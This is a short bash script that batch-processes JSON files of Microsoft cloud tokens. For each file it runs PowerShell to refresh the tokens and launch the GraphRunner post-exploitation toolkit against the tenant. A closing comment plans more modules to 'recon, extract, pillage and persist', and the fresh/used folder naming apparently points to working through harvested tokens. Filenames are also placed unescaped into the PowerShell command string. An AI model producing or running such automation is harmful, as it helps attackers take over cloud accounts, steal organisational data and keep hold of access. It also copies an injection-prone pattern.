#!/bin/bash

# Set the directory to check for token files
DIRECTORY="shared-data/fresh-data"
LOG_DIR="shared-data/used-data"  # Directory to store log files

# Check if the directory exists
if [ ! -d "$DIRECTORY" ]; then
  echo "Directory does not exist: $DIRECTORY"
  exit 1
fi

# Check if log directory exists; if not, create it
if [ ! -d "$LOG_DIR" ]; then
  mkdir -p "$LOG_DIR"
fi

# Get the list of files in the directory
FILES=$(ls -1 "$DIRECTORY")

# Check if there are any files in the directory
if [ -z "$FILES" ]; then
  echo "No files found in the directory: $DIRECTORY"
  exit 0
fi

# Loop through each file and run PowerShell commands
for FILE in $FILES; do
  FULL_PATH="$DIRECTORY/$FILE"
  
  # Ensure it's a file and not a directory
  if [ -f "$FULL_PATH" ]; then
    echo "Processing file: $FULL_PATH"
    
    # Create a log file for this run
    SAFE_FILENAME=$(basename "$FILE" .json)_log.txt
    LOG_FILE="$LOG_DIR/$SAFE_FILENAME"
    touch "$LOG_FILE"  # Create the log file

    # Run the PowerShell commands using the current file and append to log file
    pwsh -Command "
      try {
        # Load the file content into a JSON object
        Write-Host 'Loading tokens from $FULL_PATH' | Out-File -Append '$LOG_FILE'
        \$tokens = Get-Content '$FULL_PATH' -raw | ConvertFrom-Json
        Write-Host 'Tokens successfully loaded' | Out-File -Append '$LOG_FILE'
      }
      catch {
        Write-Host 'Failed to load tokens from $FULL_PATH: ' \$_ | Out-File -Append '$LOG_FILE'
      }

      try {
        # Refresh tokens using Invoke-RefreshGraphTokens
        Write-Host 'Refreshing tokens...' | Out-File -Append '$LOG_FILE'
        \$roadToolsAuth = \$tokens
        Invoke-RefreshGraphTokens -RefreshToken \$roadToolsAuth.refreshToken -tenantid \$roadToolsAuth.tenantId
        Write-Host 'Tokens refreshed successfully' | Out-File -Append '$LOG_FILE'
      }
      catch {
        Write-Host 'Failed to refresh tokens: ' \$_ | Out-File -Append '$LOG_FILE'
      }

      try {
        # Run Graph API commands using Invoke-GraphRunner
        Write-Host 'Running GraphRunner...' | Out-File -Append '$LOG_FILE'
        Invoke-GraphRunner -Tokens \$tokens
        Write-Host 'GraphRunner executed successfully' | Out-File -Append '$LOG_FILE'
      }
      catch {
        Write-Host 'Failed to run GraphRunner: ' \$_ | Out-File -Append '$LOG_FILE'
      }
    "

    # Add more GraphRunner modules to recon, extract, pillage and persist. 

  else
    echo "$FULL_PATH is not a regular file, skipping..."
  fi
done
